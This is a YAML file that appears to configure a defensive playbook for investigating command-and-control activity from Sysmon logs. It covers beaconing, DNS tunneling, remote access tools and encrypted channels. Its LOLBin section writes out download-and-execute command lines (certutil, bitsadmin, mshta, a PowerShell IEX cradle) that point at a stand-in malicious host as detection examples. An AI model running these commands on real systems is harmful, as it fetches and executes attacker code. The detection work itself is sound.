name: command_and_control
display_name: Command & Control
description: Investigation strategies for detecting command and control - identifying C2 channels, beaconing patterns, and communication with attacker infrastructure

playbook: |
  ## COMMAND AND CONTROL (C2) INVESTIGATION PLAYBOOK
  
  ### What is Command and Control?
  Techniques attackers use to communicate with compromised systems and maintain control over the network.
  
  ### Key Indicators to Investigate:
  
  1. **Network Beaconing (Sysmon 3)**
     - Periodic connections to external IPs (C2 check-ins)
     - Fields: EventData.DestinationIp, EventData.DestinationPort, EventData.Image
     - Query: Aggregate Sysmon 3 by DestinationIp and timestamp intervals
     - Patterns to detect:
       - Regular intervals (every 60s, 5min, 15min)
       - Same destination IP, consistent port
       - Small payload sizes (heartbeat traffic)
     - Red flags: Non-browser processes with regular external connections
  
  2. **Unusual Network Connections (Sysmon 3)**
     - Unexpected processes making network connections
     - Fields: EventData.Image, EventData.DestinationIp, EventData.DestinationPort
     - Query: event_type='evtx_sysmon_3'
     - Suspicious source processes:
       - powershell.exe, cmd.exe, rundll32.exe
       - Office applications (Word, Excel)
       - System utilities (certutil.exe, regsvr32.exe)
     - Common C2 ports: 443 (HTTPS), 80 (HTTP), 8080, 53 (DNS), 22 (SSH)
  
  3. **DNS Tunneling (Sysmon 22, DNS logs)**
     - Sysmon 22: DNS query events
     - Fields: EventData.QueryName, EventData.QueryResults
     - Query: event_type='evtx_sysmon_22'
     - Indicators:
       - Long subdomain names (>50 chars)
       - High entropy domain names (random strings)
       - Frequent queries to same domain
       - Unusual TXT, NULL, or CNAME queries
     - Red flags: Base64-encoded subdomains, excessive query volume
  
  4. **Web-Based C2 (Sysmon 3, Proxy logs)**
     - HTTP/HTTPS connections to malicious domains
     - User-Agent anomalies (custom, outdated, or missing)
     - Query: Check DestinationIp reputation, domain age
     - Patterns:
       - POST requests with encrypted payloads
       - Regular GET requests to same URI
       - Unusual HTTP headers
     - Red flags: Connections to newly registered domains, suspicious TLDs
  
  5. **Remote Access Tools (Event ID 4688, Sysmon 1, 3)**
     - Legitimate tools abused for C2
     - Tools: TeamViewer, AnyDesk, LogMeIn, VNC, RDP
     - Query: `search_events_by_content` for remote access tools
     - Red flags: 
       - Unexpected installations
       - Connections to unusual IPs
       - Running under unusual accounts
  
  6. **Living-off-the-Land Binaries (LOLBins)**
     - Abusing built-in Windows tools for C2
     - Tools to watch:
       - `certutil.exe -urlcache -f http://malicious.com/payload.exe`
       - `bitsadmin.exe /transfer job http://malicious.com/file.exe`
       - `powershell.exe -c IEX(New-Object Net.WebClient).DownloadString()`
       - `mshta.exe http://malicious.com/payload.hta`
     - Query: `search_events_by_content` for LOLBin network usage
     - Red flags: LOLBins with network activity
  
  7. **Encrypted C2 Channels**
     - SSL/TLS encrypted traffic to hide C2
     - Indicators:
       - Self-signed certificates
       - Certificate mismatches
       - Unusual SSL/TLS versions
     - Query: Check for processes establishing SSL connections
     - Red flags: Non-browser SSL traffic, certificate anomalies
  
  8. **Protocol Tunneling**
     - Hiding C2 in legitimate protocols
     - Techniques:
       - ICMP tunneling (ping with data)
       - SSH tunneling (port forwarding)
       - HTTPS tunneling (proxy over SSL)
     - Query: Look for unusual protocol usage
     - Red flags: Large ICMP packets, SSH from unexpected processes
  
  9. **Cloud-Based C2**
     - Using cloud services for C2 (Dropbox, OneDrive, Pastebin)
     - Query: Check for connections to cloud APIs
     - Patterns:
       - Unusual processes accessing cloud storage
       - Automated uploads/downloads
       - API calls from scripts
     - Red flags: Cloud sync from PowerShell, cmd.exe
  
  10. **Proxy/VPN Usage**
     - Hiding C2 traffic through proxies/VPNs
     - Tools: Tor, commercial VPNs, SOCKS proxies
     - Query: Look for proxy client installations
     - Red flags: Unexpected VPN clients, Tor usage
  
  ### Investigation Strategy:
  
  **Phase 1 - Identify C2 Activity**
  - Query Sysmon 3 for external network connections
  - Aggregate by DestinationIp to find repeated connections
  - Look for beaconing patterns (regular intervals)
  
  **Phase 2 - Analyze C2 Infrastructure**
  - Identify C2 IP addresses and domains
  - Check reputation (VirusTotal, AbuseIPDB)
  - Determine hosting provider, registration date
  - Look for infrastructure patterns (same ASN, IP range)
  
  **Phase 3 - Identify C2 Processes**
  - Which processes are communicating with C2?
  - Are they legitimate tools or malware?
  - Check process lineage (parent processes)
  - Validate digital signatures
  
  **Phase 4 - Timeline Analysis**
  - When did C2 communication start?
  - How long has it been active?
  - Is it still active? (Recent connections)
  - Correlate with other attack phases
  
  ### Common C2 Patterns:
  
  - **HTTP/HTTPS Beaconing**: Regular GET/POST to same domain every 5-15 minutes
  - **DNS Tunneling**: High-frequency DNS queries with long/random subdomains
  - **LOLBin C2**: certutil/bitsadmin downloads, PowerShell web requests
  - **RAT Traffic**: TeamViewer/AnyDesk to unusual IPs
  - **Encrypted C2**: Non-browser SSL traffic on port 443
  
  ### Beaconing Detection:
  
  To detect beaconing, aggregate Sysmon 3 events:
  
  ```
  1. Group by: DestinationIp, Image
  2. Calculate: Time intervals between connections
  3. Look for: Consistent intervals (±10% variance)
  4. Red flags: 
     - Connections every 60s, 300s, 600s
     - Same destination, same process
     - Small payload sizes
  ```
  
  ### C2 Channel Types:
  
  - **Direct**: Malware → C2 IP (easy to detect, easy to block)
  - **Domain Fronting**: Malware → CDN → C2 (harder to detect)
  - **DNS**: Malware → DNS queries → C2 (covert channel)
  - **Cloud**: Malware → Dropbox/OneDrive → C2 (blends with legitimate traffic)
  - **Proxy**: Malware → Proxy → C2 (hides true destination)
  
  ### Key Questions to Answer:
  
  1. What C2 channels were used? (HTTP, DNS, encrypted)
  2. What are the C2 IP addresses/domains?
  3. Which processes are communicating with C2?
  4. When did C2 communication start/end?
  5. Is C2 still active? (Recent connections)
  6. What data was sent to C2? (Commands, exfiltration)
  7. How can C2 be blocked? (Firewall rules, DNS sinkhole)
  
  ### Enrichment Sources:
  
  - **IP Reputation**: VirusTotal, AbuseIPDB, Talos Intelligence
  - **Domain Reputation**: URLhaus, PhishTank, WHOIS (registration date)
  - **Certificate Analysis**: SSL certificate issuer, validity, subject
  - **Geolocation**: Unusual countries, hosting providers
  
  ### Behavioral Indicators:
  
  - **Persistent**: C2 active for days/weeks
  - **Intermittent**: C2 only during business hours (blend in)
  - **Bursty**: High activity during data exfiltration
  - **Dormant**: Long periods of inactivity (sleeper implant)
